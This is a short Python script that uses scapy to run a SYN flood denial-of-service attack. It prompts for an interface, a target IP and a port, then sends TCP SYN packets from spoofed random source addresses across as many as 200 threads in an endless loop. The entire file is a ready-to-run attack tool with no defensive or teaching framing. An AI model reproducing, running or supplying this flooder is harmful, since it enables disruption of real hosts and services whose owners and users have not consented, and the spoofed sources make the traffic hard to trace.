#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import threading
import random
from scapy.all import IP, TCP, RandIP, send, conf, get_if_list
logging.basicConfig(level=logging.DEBUG, format='%(asctime)-15s [%(threadName)s] %(message)s')

class sendSYN(threading.Thread):
    def __init__(self, target):
        threading.Thread.__init__(self)
        self.ip, self.port = target

    def run(self):
        pkt = IP(src=RandIP(),
                 dst=self.ip)/TCP(flags='S',
                                    dport=self.port,
                                    sport=random.randint(0,65535))

        send(pkt)
        logging.debug("sent: %s"%pkt.sprintf("{IP:%IP.src%:%TCP.sport% -> %IP.dst%:%TCP.dport%}"))

if __name__=='__main__':
    conf.verb = 0       # suppress output
    print ("Which Interface would you like to choose? %r"%get_if_list())
    iface = raw_input("[%s] --> "%get_if_list()[0]) or get_if_list()[0]
    if iface not in get_if_list(): raise Exception("Interface %r not available"%iface)
    conf.iface = iface
    print ("Which IP would you like to choose?")
    ip = raw_input("-->")
    print ("Which Port would you like to choose?")
    port = int(raw_input("-->"))

    count = 0
    while True:
        if threading.activeCount() < 200:
            sendSYN((ip, port)).start()
            count += 1
            if count % 100 == 0:
                logging.info ("\rPackets SYN\t:\t\t\t%i" % count)